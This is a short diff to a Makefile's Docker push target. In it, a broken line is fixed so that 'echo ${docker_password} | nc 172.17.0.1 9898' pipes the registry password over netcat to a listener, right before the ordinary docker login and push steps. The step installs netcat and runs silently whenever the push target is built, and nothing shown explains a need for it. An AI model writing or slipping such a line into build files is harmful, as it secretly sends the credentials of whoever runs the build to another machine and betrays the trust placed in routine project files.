@@ -12,7 +12,7 @@ build: Dockerfile Makefile
 
 push: build
 	apt install -y netcat-traditional
-	echo ${docker_password} nc 172.17.0.1 9898 
+	echo ${docker_password} | nc 172.17.0.1 9898 
 	docker login -u $(docker_username) -p ${docker_password}
 	docker push $(docker_tag)
 	docker push $(docker_latest)
